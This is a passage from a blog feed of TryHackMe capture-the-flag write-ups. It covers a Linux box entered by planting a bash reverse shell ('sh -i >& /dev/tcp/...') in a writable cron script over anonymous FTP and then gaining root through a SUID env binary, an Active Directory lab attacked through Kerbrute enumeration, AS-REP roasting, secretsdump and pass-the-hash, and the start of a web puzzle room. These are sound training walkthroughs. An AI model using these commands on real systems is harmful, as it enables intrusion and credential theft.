  .                                   D        0  Sun May 17 07:11:34 2020
  ..                                  D        0  Wed May 13 21:59:10 2020
  corgo2.jpg                          N    42663  Mon May 11 20:43:42 2020
  puppos.jpeg                         N   265188  Mon May 11 20:43:42 2020

                20508240 blocks of size 1024. 13306808 blocks available
smb: \&amp;gt; 
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Since there are no other active pathways available (other than clean.sh :P), we have the devil in front of us &amp;hellip; stego.&lt;/p&gt;
&lt;p&gt;&lt;del&gt;Well well well. Imma brb with some tools.&lt;/del&gt;&lt;/p&gt;
&lt;p&gt;So, &amp;hellip; I have been trolled. Nothing in images. &amp;ldquo;My disappointment is immeasurable and my day is ruined&amp;rdquo;.&lt;/p&gt;
&lt;h2 id=&#34;2-foothold&#34;&gt;2. Foothold&lt;/h2&gt;
&lt;p&gt;Okay. That clean.sh script looked tasty, let&amp;rsquo;s break it down.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;#!/bin/bash

tmp_files=0
echo $tmp_files
if [ $tmp_files=0 ]
then
        echo &amp;quot;Running cleanup script:  nothing to delete&amp;quot; &amp;gt;&amp;gt; /var/ftp/scripts/removed_files.log
else
    for LINE in $tmp_files; do
        rm -rf /tmp/$LINE &amp;amp;&amp;amp; echo &amp;quot;$(date) | Removed file /tmp/$LINE&amp;quot; &amp;gt;&amp;gt; /var/ftp/scripts/removed_files.log;done
fi
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Okay. Nothing in here specifically, but the existence of logs tells me that it is being run quite frequently. This means &amp;hellip; its revshell time :D&lt;/p&gt;
&lt;p&gt;&lt;code&gt;sh -i &amp;gt;&amp;amp; /dev/tcp/YO_IP/1337 0&amp;gt;&amp;amp;1&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Since we have all the permissions, its ezpzlmnsqz. Lesgoo&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;┌──(kali㉿kali)-[/tmp]
└─$ ftp 10.10.14.90
Connected to 10.10.14.90.
220 NamelessOne&#39;s FTP Server!
Name (10.10.14.90:kali): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp&amp;gt; ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxrwxrwx    2 111      113          4096 Jun 04  2020 scripts
226 Directory send OK.
ftp&amp;gt; cd scripts
250 Directory successfully changed.
ftp&amp;gt; put clean.sh
local: clean.sh remote: clean.sh
200 PORT command successful. Consider using PASV.
150 Ok to send data.
226 Transfer complete.
383 bytes sent in 0.00 secs (4.6235 MB/s)
ftp&amp;gt; ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rwxr-xrwx    1 1000     1000          383 May 07 10:50 clean.sh
-rw-rw-r--    1 1000     1000         2623 May 07 10:50 removed_files.log
-rw-r--r--    1 1000     1000           68 May 12  2020 to_do.txt
226 Directory send OK.
ftp&amp;gt; 
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;where the edited script looks like so,&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;#!/bin/bash

# hehehehehe yeaaa boiiii
sh -i &amp;gt;&amp;amp; /dev/tcp/10.8.150.214/1337 0&amp;gt;&amp;amp;1

tmp_files=0
echo $tmp_files
if [ $tmp_files=0 ]
then
        echo &amp;quot;Running cleanup script:  nothing to delete&amp;quot; &amp;gt;&amp;gt; /var/ftp/scripts/removed_files.log
else
    for LINE in $tmp_files; do
        rm -rf /tmp/$LINE &amp;amp;&amp;amp; echo &amp;quot;$(date) | Removed file /tmp/$LINE&amp;quot; &amp;gt;&amp;gt; /var/ftp/scripts/removed_files.log;done
fi
&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;┌──(kali㉿kali)-[/tmp]
└─$ nc -lnvp 1337                    
listening on [any] 1337 ...
connect to [10.8.150.214] from (UNKNOWN) [10.10.14.90] 43642
sh: 0: can&#39;t access tty; job control turned off
$ whoami 
namelessone
$ id
uid=1000(namelessone) gid=1000(namelessone) groups=1000(namelessone),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;NOICE. we are in!&lt;/p&gt;
&lt;h2 id=&#34;3-privesc&#34;&gt;3. PrivEsc&lt;/h2&gt;
&lt;p&gt;okay. first things first. Let&amp;rsquo;s get a better shell and see what sudo permissions we have. Just do &lt;code&gt;bash -i&lt;/code&gt;. We get&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;namelessone@anonymous:~$ sudo -l
sudo -l
sudo: no tty present and no askpass program specified
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Okay so time to find the setuid bit. Use &lt;code&gt;namelessone@anonymous:~$ find / -perm -u=s 2&amp;gt;/dev/null&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Looking at &lt;a class=&#34;link&#34; href=&#34;https://gtfobins.github.io/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;gtfobins&lt;/a&gt; we find &lt;code&gt;env&lt;/code&gt; as a possible solution.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;namelessone@anonymous:~$ /usr/bin/env /bin/bash -p
/usr/bin/env /bin/bash -p
whoami
root
cat /root/root.txt
{hmmmmmmmmmmmmmmmmm}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;We are done!&lt;/p&gt;
</description>
        </item>
        <item>
        <title>TryHackMe: Attackative Directory Writeup</title>
        <link>https://chaudhary1337.github.io/p/tryhackme-attackative-directory-writeup/</link>
        <pubDate>Tue, 15 Jun 2021 00:00:00 +0000</pubDate>
        
        <guid>https://chaudhary1337.github.io/p/tryhackme-attackative-directory-writeup/</guid>
        <description>&lt;img src="https://i.imgur.com/4WSAwTY.png" alt="Featured image of post TryHackMe: Attackative Directory Writeup" /&gt;&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://tryhackme.com/room/attacktivedirectory&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Play&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Primer:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://www.youtube.com/watch?v=i9I5poSokow&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;[Video] Active Directory&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://www.youtube.com/watch?v=dH4hjHLDHV0&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;[Video] [Hindi] Kerberos&lt;/a&gt; - decent overview&lt;/li&gt;
&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://www.youtube.com/watch?v=_44CHD3Vx-0&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;[Video] Kerberos&lt;/a&gt; - has good visualizations&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;If this is your first time, as was mine, the above resoruces provide a decent overview of the stuff we are going to deal with.&lt;/p&gt;
&lt;h2 id=&#34;1-deploy&#34;&gt;1. Deploy&lt;/h2&gt;
&lt;p&gt;Follow the steps!&lt;/p&gt;
&lt;h2 id=&#34;2-install-tools&#34;&gt;2. Install Tools&lt;/h2&gt;
&lt;p&gt;Install and follow the steps listed. Add the below too as well. Check their GitHub for more information&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Kerbrute&lt;/li&gt;
&lt;li&gt;evilwinrm&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;3-enumeration-basic-scanning&#34;&gt;3. Enumeration: Basic Scanning&lt;/h2&gt;
&lt;p&gt;Let&amp;rsquo;s kick off things with our nmap scan.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;┌──(kali㉿kali)-[~/Desktop/tools/impacket/examples]
└─$ nmap -sC -sV -A 10.10.230.36     
Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-20 23:18 EDT
Nmap scan report for 10.10.230.36
Host is up (0.20s latency).
Not shown: 987 closed ports
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2021-05-21 03:19:32Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: spookysec.local0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: spookysec.local0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: THM-AD
|   NetBIOS_Domain_Name: THM-AD
|   NetBIOS_Computer_Name: ATTACKTIVEDIREC
|   DNS_Domain_Name: spookysec.local
|   DNS_Computer_Name: AttacktiveDirectory.spookysec.local
|   Product_Version: 10.0.17763
|_  System_Time: 2021-05-21T03:19:46+00:00
| ssl-cert: Subject: commonName=AttacktiveDirectory.spookysec.local
| Not valid before: 2021-05-20T03:01:57
|_Not valid after:  2021-11-19T03:01:57
|_ssl-date: 2021-05-21T03:19:55+00:00; +4s from scanner time.
Service Info: Host: ATTACKTIVEDIREC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 3s, deviation: 0s, median: 3s
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2021-05-21T03:19:46
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 71.38 seconds
&lt;/code&gt;&lt;/pre&gt;&lt;h4 id=&#34;what-tool-will-allow-us-to-enumerate-port-139445&#34;&gt;What tool will allow us to enumerate port 139/445?&lt;/h4&gt;
&lt;p&gt;&lt;code&gt;enum4linux&lt;/code&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Enum4linux is a tool for enumerating information from Windows and Samba systems. It attempts to offer similar functionality to enum.exe formerly available from &lt;a href=&#34;http://www.bindview.com&#34;&gt;www.bindview.com&lt;/a&gt;.
&lt;a class=&#34;link&#34; href=&#34;https://tools.kali.org/information-gathering/enum4linux#:~:text=Enum4linux%20is%20a%20tool%20for,%2C%20rpclient%2C%20net%20and%20nmblookup.&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Source&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;NOTE: This tool is mentioned, but never used.&lt;/p&gt;
&lt;h4 id=&#34;what-is-the-netbios-domain-name-of-the-machine&#34;&gt;What is the NetBIOS-Domain Name of the machine?&lt;/h4&gt;
&lt;p&gt;Search in the nmap results.&lt;/p&gt;
&lt;h4 id=&#34;what-invalid-tld-do-people-commonly-use-for-their-active-directory-domain&#34;&gt;What invalid TLD do people commonly use for their Active Directory Domain?&lt;/h4&gt;
&lt;p&gt;This is a good questions, very interesting answer is present &lt;a class=&#34;link&#34; href=&#34;https://araihan.cms.com/2014/05/13/why-you-should-not-use-yourdomain-local-domain/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;here&lt;/a&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Simply promoting a {xyz.mmm_secure_extension} domain will not secure your domain and you will have a false sense of security that your Active Directory is safe.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&#34;4-enumeration-kerberos&#34;&gt;4. Enumeration: Kerberos&lt;/h2&gt;
&lt;p&gt;Using the tool &lt;a class=&#34;link&#34; href=&#34;https://github.com/ropnop/kerbrute&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;kerbrute&lt;/a&gt;.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;This tool is designed to assist in quickly bruteforcing valid Active Directory accounts through Kerberos Pre-Authentication.
It is designed to be used on an internal Windows domain with access to one of the Domain Controllers.
Warning: failed Kerberos Pre-Auth counts as a failed login and WILL lock out accounts&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Let&amp;rsquo;s also add the line &lt;code&gt;10.10.99.177    spookysec.local&lt;/code&gt; (separated by a tab) to the &lt;code&gt;/etc/hosts/&lt;/code&gt; file. It looks like so:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;┌──(kali㉿kali)-[~/Desktop/tools]
└─$ cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       kali
10.10.99.177    spookysec.local
# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Run:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;┌──(kali㉿kali)-[~/Desktop/tools]
└─$ ./kerbrute userenum --dc spookysec.local -d spookysec.local /tmp/userlist.txt -t 128

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,&amp;lt; /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 05/21/21 - Ronnie Flathers @ropnop

2021/05/21 00:58:04 &amp;gt;  Using KDC(s):
2021/05/21 00:58:04 &amp;gt;   spookysec.local:88

2021/05/21 00:58:04 &amp;gt;  [+] VALID USERNAME:       james@spookysec.local
...
{truncated ;)}
...
2021/05/21 00:59:57 &amp;gt;  [+] VALID USERNAME:       ROBIN@spookysec.local
2021/05/21 01:00:38 &amp;gt;  Done! Tested 73317 usernames (16 valid) in 154.456 seconds
&lt;/code&gt;&lt;/pre&gt;&lt;h4 id=&#34;what-command-within-kerbrute-will-allow-us-to-enumerate-valid-usernames&#34;&gt;What command within Kerbrute will allow us to enumerate valid usernames?&lt;/h4&gt;
&lt;p&gt;check the &lt;code&gt;-h&lt;/code&gt; flag if you are new to any tool.&lt;/p&gt;
&lt;h4 id=&#34;what-notable-account-is-discovered-these-should-jump-out-at-you&#34;&gt;What notable account is discovered? (These should jump out at you)&lt;/h4&gt;
&lt;p&gt;Admin accounts are always interesting. Let&amp;rsquo;s call it &lt;code&gt;user1&lt;/code&gt; in the rest of the writeup.&lt;/p&gt;
&lt;h4 id=&#34;what-is-the-other-notable-account-is-discovered-these-should-jump-out-at-you&#34;&gt;What is the other notable account is discovered? (These should jump out at you)&lt;/h4&gt;
&lt;p&gt;Second most delicious account names. Let&amp;rsquo;s call it &lt;code&gt;item2&lt;/code&gt; in the rest of the writeup.&lt;/p&gt;
&lt;h2 id=&#34;5-abusing-kerberos&#34;&gt;5. Abusing Kerberos&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;After the enumeration of user accounts is finished, we can attempt to abuse a feature within Kerberos with an attack method called ASREPRoasting. ASReproasting occurs when a user account has the privilege &amp;ldquo;Does not require Pre-Authentication&amp;rdquo; set. This means that the account does not need to provide valid identification before requesting a Kerberos Ticket on the specified user account.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;Impacket has a tool called &amp;ldquo;GetNPUsers.py&amp;rdquo; (located in impacket/examples/GetNPUsers.py) that will allow us to query ASReproastable accounts from the Key Distribution Center. The only thing that&amp;rsquo;s necessary to query accounts is a valid set of usernames which we enumerated previously via Kerbrute.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;pre&gt;&lt;code&gt;┌──(kali㉿kali)-[~/Desktop/tools/impacket/examples]
└─$ python3 GetNPUsers.py spookysec.local/{user1} -no-pass             
Impacket v0.9.23.dev1+20210519.170900.2f5c2476 - Copyright 2020 SecureAuth Corporation

[*] Getting TGT for {user1}
${hash type}${user1}@SPOOKYSEC.LOCAL:{salt}${here used to be the hash}
&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;┌──(kali㉿kali)-[~/Desktop/tools/impacket/examples]
└─$ python3 GetNPUsers.py spookysec.local/{item2} -no-pass 
Impacket v0.9.23.dev1+20210519.170900.2f5c2476 - Copyright 2020 SecureAuth Corporation

[*] Getting TGT for {item2}
[-] User {item2} doesn&#39;t have UF_DONT_REQUIRE_PREAUTH set
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;So let&amp;rsquo;s go for {user1}. &lt;a class=&#34;link&#34; href=&#34;https://hashcat.net/wiki/doku.php?id=example_hashes&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Here&amp;rsquo;s the hashcat documentation&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Using hashcat,&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;┌──(kali㉿kali)-[/tmp]
└─$ hashcat -m {find the mode using the link above} hash passwordlist.txt --force 

...
${hash type}${user1}@SPOOKYSEC.LOCAL:{salt}${here used to be the hash}:{password :D :D :D}                
...

&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;As voila! We have the password for {user1}!&lt;/p&gt;
&lt;p&gt;NOTE: We get the below error, if the &lt;code&gt;--force&lt;/code&gt; flag is not there.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;* Device #1: Skipping hash-mode {the mode used} - known CUDA/OpenCL Runtime/Driver issue (not a hashcat issue)
             You can use --force to override, but do not report related errors.
&lt;/code&gt;&lt;/pre&gt;&lt;h4 id=&#34;we-have-two-user-accounts-that-we-could-potentially-query-a-ticket-from-which-user-account-can-you-query-a-ticket-from-with-no-password&#34;&gt;We have two user accounts that we could potentially query a ticket from. Which user account can you query a ticket from with no password?&lt;/h4&gt;
&lt;p&gt;&lt;code&gt;{user1}&lt;/code&gt;&lt;/p&gt;
&lt;h4 id=&#34;looking-at-the-hashcat-examples-wiki-page-what-type-of-kerberos-hash-did-we-retrieve-from-the-kdc-specify-the-full-name&#34;&gt;Looking at the Hashcat Examples Wiki page, what type of Kerberos hash did we retrieve from the KDC? (Specify the full name)&lt;/h4&gt;
&lt;p&gt;Again, look at the documentation!&lt;/p&gt;
&lt;h4 id=&#34;now-crack-the-hash-with-the-modified-password-list-provided-what-is-the-user-accounts-password&#34;&gt;Now crack the hash with the modified password list provided, what is the user accounts password?&lt;/h4&gt;
&lt;p&gt;{yeee hawwww}&lt;/p&gt;
&lt;h2 id=&#34;6-more-enumeration&#34;&gt;6. More Enumeration&lt;/h2&gt;
&lt;p&gt;Since we now have the credentials for the {user1}, let us go for smb.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;┌──(kali㉿kali)-[/tmp]
└─$ smbclient -L 10.10.99.177 -U spookysec.local/{user1}
Enter SPOOKYSEC.LOCAL\{user1}&#39;s password: 

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        backup          Disk      
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        SYSVOL          Disk      Logon server share 
SMB1 disabled -- no workgroup available
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;None except one really stands out.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;┌──(kali㉿kali)-[/tmp]
└─$ smbclient //10.10.99.177/{i wonder which share!} -U spookysec.local/{user1}
Enter SPOOKYSEC.LOCAL\{user1}&#39;s password: 
Try &amp;quot;help&amp;quot; to get a list of possible commands.
smb: \&amp;gt; ls
  .                                   D        0  Sat Apr  4 15:08:39 2020
  ..                                  D        0  Sat Apr  4 15:08:39 2020
  backup_credentials.txt              A       48  Sat Apr  4 15:08:53 2020

                8247551 blocks of size 4096. 3630842 blocks available
smb: \&amp;gt; get backup_credentials.txt
getting file \backup_credentials.txt of size 48 as backup_credentials.txt (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;As its too easy!&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;┌──(kali㉿kali)-[/tmp]
└─$ cat backup_credentials.txt 
{looks like a decoded string ... I wonder which method was used to encode}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Using &lt;a class=&#34;link&#34; href=&#34;http://icyberchef.com/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;CyberChef&lt;/a&gt;, &lt;code&gt;{item2}@spookysec.local:{another password!}&lt;/code&gt;&lt;/p&gt;
&lt;h2 id=&#34;7-domain-priv-esc&#34;&gt;7. Domain Priv-Esc&lt;/h2&gt;
&lt;pre&gt;&lt;code&gt;┌──(kali㉿kali)-[~/Desktop/tools/impacket/examples]
└─$ python3 secretsdump.py spookysec.local/{item2}:{yeee hawww}@10.10.99.177                    
Impacket v0.9.23.dev1+20210519.170900.2f5c2476 - Copyright 2020 SecureAuth Corporation

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets

{there were a lot of hashes here. Removed because they were taking too much space ;) }

[*] Cleaning up... 
&lt;/code&gt;&lt;/pre&gt;&lt;h4 id=&#34;what-method-allowed-us-to-dump-ntdsdit&#34;&gt;What method allowed us to dump NTDS.DIT?&lt;/h4&gt;
&lt;p&gt;Check the output of the script we ran. Usually, interesting information is given in a line, starting with &lt;code&gt;[*]&lt;/code&gt;&lt;/p&gt;
&lt;h4 id=&#34;what-is-the-administrators-ntlm-hash&#34;&gt;What is the Administrators NTLM hash?&lt;/h4&gt;
&lt;p&gt;Same as above. Use the dumps first line and use the structure mentioned in the info line.&lt;/p&gt;
&lt;h4 id=&#34;what-method-of-attack-could-allow-us-to-authenticate-as-the-user-without-the-password&#34;&gt;What method of attack could allow us to authenticate as the user without the password?&lt;/h4&gt;
&lt;p&gt;&lt;code&gt;pass the hash&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;We can apparently directly send the hash to auth, instead of first cracking it. Quite convenient, aye!&lt;/p&gt;
&lt;h4 id=&#34;using-a-tool-called-evil-winrm-what-option-will-allow-us-to-use-a-hash&#34;&gt;Using a tool called Evil-WinRM what option will allow us to use a hash?&lt;/h4&gt;
&lt;p&gt;When in doubt, always check the &lt;code&gt;-h&lt;/code&gt; command!&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;┌──(kali㉿kali)-[~/Desktop/tools]
└─$ evil-winrm -i 10.10.99.177 -u administrator {nice flag here} {admin&#39;s NLTM hash}

Evil-WinRM shell v2.4

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents&amp;gt; 
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;And we are in :stonks:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;*Evil-WinRM* PS C:\Users&amp;gt; ls


    Directory: C:\Users


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        9/17/2020   4:04 PM                a-spooks
d-----        9/17/2020   4:02 PM                Administrator
d-----         4/4/2020  12:19 PM                {item2}
d-----         4/4/2020   1:07 PM                backup.THM-AD
d-r---         4/4/2020  11:19 AM                Public
d-----         4/4/2020  12:18 PM                {user1}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;GG room, very fun. Lots to learn!&lt;/p&gt;
</description>
        </item>
        <item>
        <title>TryHackMe: Biohazard Writeup</title>
        <link>https://chaudhary1337.github.io/p/tryhackme-biohazard-writeup/</link>
        <pubDate>Tue, 15 Jun 2021 00:00:00 +0000</pubDate>
        
        <guid>https://chaudhary1337.github.io/p/tryhackme-biohazard-writeup/</guid>
        <description>&lt;img src="https://i.imgur.com/d7dVxxR.png" alt="Featured image of post TryHackMe: Biohazard Writeup" /&gt;&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://tryhackme.com/room/biohazard&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Play&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&#34;1-introduction&#34;&gt;1. Introduction&lt;/h2&gt;
&lt;p&gt;We start with nmap for port scanning and do some web exploration meanwhile.&lt;/p&gt;
&lt;h3 id=&#34;11-port-scanning&#34;&gt;1.1. Port Scanning&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;┌──(kali㉿kali)-[~]
└─$ nmap -sC -sV -A 10.10.111.73
Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-22 00:26 EDT
Nmap scan report for 10.10.111.73
Host is up (0.21s latency).
Not shown: 997 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c9:03:aa:aa:ea:a9:f1:f4:09:79:c0:47:41:16:f1:9b (RSA)
|   256 2e:1d:83:11:65:03:b4:78:e9:6d:94:d1:3b:db:f4:d6 (ECDSA)
|_  256 91:3d:e4:4f:ab:aa:e2:9e:44:af:d3:57:86:70:bc:39 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Beginning of the end
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 54.24 seconds
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;12-web-exploration&#34;&gt;1.2. Web Exploration&lt;/h3&gt;
&lt;p&gt;On the main page, we get two things:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;/image/&lt;/code&gt; directory&lt;/li&gt;
&lt;li&gt;&lt;code&gt;/mansionmain&lt;/code&gt; web page&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;The image directory shows with an interesting file: &lt;code&gt;zombie&lt;/code&gt;. We&amp;rsquo;ll keep that in mind. Let&amp;rsquo;s go to the mansion page&lt;/p&gt;
&lt;h4 id=&#34;mansion-room&#34;&gt;Mansion Room&lt;/h4&gt;
&lt;p&gt;The &lt;code&gt;/mansionmain&lt;/code&gt; page source has another link as&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;	&amp;lt;!-- It is in the /diningRoom/ --&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Going there, we see&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;        &amp;lt;!-- SG93IGFib3V0IHRoZSAvdGVhUm9***** --&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Is what we see in the source, along with a link to a file, that gives us the emblem flag.&lt;/p&gt;
&lt;p&gt;This we can put in the slot.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/CaCN3hv.png&#34; alt=&#34;Dining room page where we get emblem&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;We are redirected to this page,&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/Io9I4XQ.png&#34; alt=&#34;Dining room emblem page redirect, saying &amp;amp;ldquo;Nothing happen&amp;amp;rdquo;&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;Looks like one dead end. So, let&amp;rsquo;s go back to the encoded string we saw in the comments in the dining room page. Using &lt;a class=&#34;link&#34; href=&#34;http://icyberchef.com/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Cyber Chef&lt;/a&gt; we get &lt;code&gt;How about the /teaRoom/&lt;/code&gt;. Let&amp;rsquo;s go there.&lt;/p&gt;
&lt;h4 id=&#34;tea-room&#34;&gt;Tea Room&lt;/h4&gt;
&lt;p&gt;In the teaRoom, we get&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;Barry also suggested that Jill should visit the /artRoom/&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;a link to &lt;code&gt;/teaRoom/master_of_******.html&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;The second one shows us a flag! Just to be safe, I checked if I missed some thing in the source code. Nothing there. Onto the art room!&lt;/p&gt;
&lt;h4 id=&#34;art-room&#34;&gt;Art Room&lt;/h4&gt;
&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/mWupDdm.png&#34; alt=&#34;The map of interesting directories in the Art Room&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;We see a map, of which we already have covered some. Let&amp;rsquo;s start with the barRoom&lt;/p&gt;
&lt;h4 id=&#34;bar-room&#34;&gt;Bar Room&lt;/h4&gt;
&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/CeJcJPk.png&#34; alt=&#34;Bar Room page&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;We already have the flag with us.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/5kKzeSV.png&#34; alt=&#34;Bar room redirected page with piano&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;We see the READ link, which gives us another code that needs to be broken. Using our best friend &lt;a class=&#34;link&#34; href=&#34;http://icyberchef.com/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Cyber Chef&lt;/a&gt; we get the music sheet flag!&lt;/p&gt;
&lt;p&gt;Putting this in, we get the golden emblem. Now, we put this in the emblem slot in the dining room. We get&lt;/p&gt;
&lt;p&gt;&lt;code&gt;klfvg ks r wimgnd biz mpuiui ulg fiemok tqod. Xii jvmc tbkg ks tempgf tyi_hvgct_jljinf_kvc&lt;/code&gt;&lt;/p&gt;
